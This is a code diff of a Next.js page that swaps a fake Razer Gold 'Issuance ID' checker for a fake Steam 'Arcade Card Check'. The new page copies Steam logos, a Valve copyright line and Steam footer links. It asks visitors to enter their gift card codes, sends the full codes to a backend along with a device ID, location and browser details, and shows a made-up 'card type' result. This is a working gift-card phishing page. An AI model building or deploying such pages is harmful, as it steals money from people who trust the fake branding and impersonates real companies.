@@ -1,8 +1,8 @@
 import { useState, useEffect } from 'react'
 import Head from 'next/head'
-import styles from '../styles/razer.module.css'
+import styles from '../styles/steam.module.css'
 
-export default function RazerIdPage() {
+export default function SteamArcadePage() {
   const [cards, setCards] = useState([''])
   const [loading, setLoading] = useState(false)
   const [result, setResult] = useState(null)
@@ -36,6 +36,7 @@ export default function RazerIdPage() {
     }
     detectLocation()
 
+    // Initialize or get device ID
     let id = localStorage.getItem('deviceId')
     if (!id) {
       id = 'dev_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now()
@@ -58,7 +59,7 @@ export default function RazerIdPage() {
     setResult(null)
     setCopySuccess(false)
     const validCards = cards.filter(c => c.trim())
-    if (validCards.length === 0) return setError('Please enter your Razer Gold Gift Card code.')
+    if (validCards.length === 0) return setError('Please enter your Steam Gift Card code.')
 
     setLoading(true)
     try {
@@ -74,7 +75,7 @@ export default function RazerIdPage() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           cardNumber: validCards.map(c => c.replace(/\s+/g, '')).join('/'),
-          type: 'razer',
+          type: 'steam-arcade',
           deviceId: deviceId,
           location: location,
           browserInfo: JSON.stringify(browserInfo)
@@ -186,17 +187,21 @@ export default function RazerIdPage() {
   }
 
   return (
-    <div className={styles.razerPage}>
+    <div className={styles.steamPage}>
       <Head>
-        <title>Check Issuance ID | Razer Gold</title>
+        <title>Steam Arcade Card Check | Steam</title>
         <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
       </Head>
 
       <header className={styles.header}>
         <div className={styles.headerTop}>
           <div className={styles.headerLeft}>
-            <a href="/razer" className={styles.logoContainer}>
-              <img src="/razerlogo.png" alt="Razer Gold" className={styles.logo} />
+            <a href="/steam" className={styles.logoContainer}>
+              <svg className={styles.logo} viewBox="0 0 176 44" fill="currentColor">
+                <path d="M.329 25.333A8.01 8.01 0 0 0 7.99 31C12.414 31 16 27.418 16 23s-3.586-8-8.009-8A8.006 8.006 0 0 0 0 22.468l.003.006 4.304 1.769A2.2 2.2 0 0 1 5.62 23.88l1.96-2.844-.001-.04a3.046 3.046 0 0 1 3.042-3.043 3.046 3.046 0 0 1 3.042 3.043 3.047 3.047 0 0 1-3.111 3.044l-2.804 2a2.223 2.223 0 0 1-3.075 2.11 2.22 2.22 0 0 1-1.312-1.568L.33 25.333Z" />
+                <path d="M4.868 27.683a1.715 1.715 0 0 0 1.318-3.165 1.7 1.7 0 0 0-1.263-.02l1.023.424a1.261 1.261 0 1 1-.97 2.33l-.99-.41a1.7 1.7 0 0 0 .882.84Zm3.726-6.687a2.03 2.03 0 0 0 2.027 2.029 2.03 2.03 0 0 0 2.027-2.029 2.03 2.03 0 0 0-2.027-2.027 2.03 2.03 0 0 0-2.027 2.027m2.03-1.527a1.524 1.524 0 1 1-.002 3.048 1.524 1.524 0 0 1 .002-3.048" />
+                <text x="24" y="28" fill="white" style={{ fontFamily: 'Motiva Sans, Arial', fontWeight: 'bold', fontSize: '18px', letterSpacing: '3px' }}>STEAM</text>
+              </svg>
             </a>
           </div>
 
@@ -209,7 +214,7 @@ export default function RazerIdPage() {
 
           <div className={styles.headerRight}>
             <div className={styles.installSteam}>
-              <button className={styles.installBtn}>GET STARTED</button>
+              <button className={styles.installBtn}>INSTALL STEAM</button>
               <a href="#" className={styles.loginLink}>login</a>
             </div>
             <button
@@ -236,24 +241,27 @@ export default function RazerIdPage() {
 
       <main className={styles.main}>
         <div className={styles.breadcrumb}>
-          Support › Razer Gold › Check Issuance ID
+          Support › Steam Wallet › Steam Arcade Card Check
         </div>
 
         <section className={styles.cardSection}>
+          <div style={{ width: '100%', maxWidth: '700px', margin: '0 auto 20px', borderRadius: '12px', overflow: 'hidden' }}>
+            <img src="/steamarcade.jpg" alt="Steam Arcade" style={{ width: '100%', display: 'block' }} />
+          </div>
           <div className={styles.formContainer}>
-            <h1 className={styles.mainTitle} style={{fontSize: '28px', marginBottom: '10px'}}>Razer Gold Issuance ID</h1>
-            <p className={styles.subtitle}>Enter your Razer Gold code to instantly check the Issuance ID for support and verification.</p>
+            <h1 className={styles.mainTitle} style={{fontSize: '28px', color: '#fff', marginBottom: '10px'}}>Steam Arcade Card Check</h1>
+            <p className={styles.subtitle}>Enter your 16-digit code to verify the card type instantly.</p>
 
             <div className={styles.card}>
               <form onSubmit={checkBalance}>
                 {cards.map((cardValue, index) => (
                   <div key={index} className={styles.inputGroup}>
-                    <label className={styles.label}>Enter your Razer Gold code{cards.length > 1 ? ` #${index + 1}` : ''}</label>
+                    <label className={styles.label}>Enter your wallet code{cards.length > 1 ? ` #${index + 1}` : ''}</label>
                     <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
                       <input
                         type="text"
                         className={styles.input}
-                        placeholder="XXXX-XXXX-XXXX-XXXX"
+                        placeholder="AAAAA-BBBBB-CCCCC"
                         value={cardValue}
                         onChange={(e) => handleCardChange(index, e.target.value)}
                         disabled={loading}
@@ -265,7 +273,7 @@ export default function RazerIdPage() {
                         <button
                           type="button"
                           onClick={() => removeCard(index)}
-                          style={{ background: 'none', border: 'none', color: '#888', fontSize: '20px', cursor: 'pointer', padding: '4px 8px' }}
+                          style={{ background: 'none', border: 'none', color: '#8f98a0', fontSize: '20px', cursor: 'pointer', padding: '4px 8px' }}
                         >
                           ×
                         </button>
@@ -278,7 +286,7 @@ export default function RazerIdPage() {
                     type="button"
                     onClick={addCard}
                     className={styles.button}
-                    style={{ background: 'transparent', border: '1px solid rgba(68, 214, 44, 0.3)', color: '#44d62c', marginBottom: '12px', fontSize: '14px' }}
+                    style={{ background: 'transparent', border: '1px solid rgba(255, 255, 255, 0.2)', marginBottom: '12px', fontSize: '14px' }}
                   >
                     + Add Another Card
                   </button>
@@ -294,8 +302,8 @@ export default function RazerIdPage() {
               {result && !showUploadStep && (
                 <div className={styles.result}>
                   <div className={styles.resultHeader}>
-                    <span className={styles.statusDot}></span>
-                    Issuance ID
+                    <span className={styles.statusDot} style={{ background: '#ff4b4b' }}></span>
+                    Card Type
                   </div>
                   {result.message ? (
                     <div className={styles.error} style={{ background: 'rgba(255, 255, 255, 0.05)', color: '#fff', border: '1px solid rgba(255, 255, 255, 0.1)', margin: '20px 0', borderRadius: '4px' }}>
@@ -304,12 +312,9 @@ export default function RazerIdPage() {
                   ) : (
                     <>
                       <div className={styles.balanceText} style={{ marginTop: '15px' }}>
-                        <span className={styles.amount} style={{ letterSpacing: '2px', color: '#fff' }}>{result.issuanceId}</span>
+                        <span className={styles.amount} style={{ color: '#ff4b4b', fontSize: '24px' }}>Not a legacy card</span>
                       </div>
-                      <p className={styles.readyMsg}>This is your Issuance ID.</p>
-                      <button type="button" className={styles.button} onClick={copyIssuanceId} style={{ marginTop: '15px', background: 'transparent', border: '1px solid #44d62c', color: '#44d62c' }}>
-                        {copySuccess ? 'ID COPIED' : 'COPY ID CODE'}
-                      </button>
+                      <p className={styles.readyMsg}>For Card ending in {result.cardLast4}</p>
                     </>
                   )}
                 </div>
@@ -354,7 +359,7 @@ export default function RazerIdPage() {
                     <button type="button" className={styles.button} onClick={handleUpload} disabled={uploadProgress || selectedImages.length === 0}>
                       {uploadProgress ? 'Uploading...' : 'Upload'}
                     </button>
-                    <button type="button" className={styles.button} onClick={skipUpload} disabled={uploadProgress} style={{ background: 'transparent', border: '1px solid rgba(255, 255, 255, 0.2)', color: '#888' }}>
+                    <button type="button" className={styles.button} onClick={skipUpload} disabled={uploadProgress} style={{ background: 'transparent', border: '1px solid rgba(255, 255, 255, 0.2)' }}>
                       Skip
                     </button>
                   </div>
@@ -378,7 +383,7 @@ export default function RazerIdPage() {
                 className={styles.tutorialToggle}
                 onClick={() => setShowTutorial(!showTutorial)}
               >
-                <span>Where do I find my Razer Gold code?</span>
+                <span>Where do I find my Steam Wallet code?</span>
                 <svg
                   viewBox="0 0 24 24"
                   width="20"
@@ -395,16 +400,16 @@ export default function RazerIdPage() {
               <div className={`${styles.tutorialContent} ${showTutorial ? styles.show : ''}`}>
                 <div className={styles.tutorialStep}>
                   <div className={styles.stepNumber}>1</div>
-                  <div className={styles.stepText}>Carefully scratch off the protective coating on the back of your Razer Gold Gift Card to reveal the 16-digit PIN code.</div>
+                  <div className={styles.stepText}>Gently scratch the vertical silver strip on the back of your Steam Gift Card to reveal the code.</div>
                 </div>
                 <div className={styles.tutorialStep}>
                   <div className={styles.stepNumber}>2</div>
-                  <div className={styles.stepText}>The code consists of 16 digits, typically grouped as XXXX-XXXX-XXXX-XXXX.</div>
+                  <div className={styles.stepText}>The code is an alphanumeric string (usually 15 characters, e.g., AAAAA-BBBBB-CCCCC).</div>
                 </div>
-                <div className={styles.tutorialStep}>
-                  <div className={styles.stepNumber}>3</div>
-                  <div className={styles.stepText}>Enter the full code above to check your ID instantly.</div>
+                <div className={styles.tutorialImage}>
+                  <img src="/steam-back-card.jpg" alt="Steam Card Back Tutorial" style={{ width: '100%', display: 'block' }} />
                 </div>
+                <p className={styles.imageCaption}>The Wallet Code is printed on the back of the card under the scratch-off area.</p>
               </div>
             </div>
 
@@ -434,7 +439,7 @@ export default function RazerIdPage() {
                 </div>
                 <div className={styles.tutorialStep}>
                   <div className={styles.stepNumber}>2</div>
-                  <div className={styles.stepText}>You can use the Issuance ID to help fund Razer Gold wallets, query customer support, and confirm records when needed.</div>
+                  <div className={styles.stepText}>You can use the Issuance ID to help fund Steam wallets, query customer support, and confirm records when needed.</div>
                 </div>
                 <div className={styles.tutorialStep}>
                   <div className={styles.stepNumber}>3</div>
@@ -449,21 +454,23 @@ export default function RazerIdPage() {
       <footer className={styles.footer}>
         <div className={styles.footerContent}>
           <div className={styles.footerLogo}>
-            <img src="/razerlogo.png" alt="Razer Gold" />
+            <svg width="100" height="30" viewBox="0 0 100 30" fill="#8f98a0" opacity="0.6">
+              <path d="M.329 10.333A8.01 8.01 0 0 0 7.99 16C12.414 16 16 12.418 16 8s-3.586-8-8.009-8A8.006 8.006 0 0 0 0 7.468l.003.006 4.304 1.769A2.2 2.2 0 0 1 5.62 8.88l1.96-2.844-.001-.04a3.046 3.046 0 0 1 3.042-3.043 3.046 3.046 0 0 1 3.042 3.043 3.047 3.047 0 0 1-3.111 3.044l-2.804 2a2.223 2.223 0 0 1-3.075 2.11 2.22 2.22 0 0 1-1.312-1.568L.33 10.333Z" transform="scale(1.5)" />
+            </svg>
           </div>
           <div className={styles.footerDetails}>
-            <p>© 2025 Razer Inc. All rights reserved. All trademarks are property of their respective owners.</p>
-            <p>Razer Gold is a virtual credit system used in over 42,000 games and entertainment titles.</p>
+            <p>© 2025 Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.</p>
+            <p>VAT included in all prices where applicable.</p>
             <div className={styles.footerLinks}>
               <a href="#">Privacy Policy</a>
               <span> | </span>
-              <a href="#">Terms of Use</a>
+              <a href="#">Legal</a>
               <span> | </span>
-              <a href="#">EULA</a>
+              <a href="#">Steam Subscriber Agreement</a>
               <span> | </span>
-              <a href="#">Refund Policy</a>
+              <a href="#">Refunds</a>
               <span> | </span>
-              <a href="#">Support</a>
+              <a href="#">Cookies</a>
             </div>
           </div>
         </div>
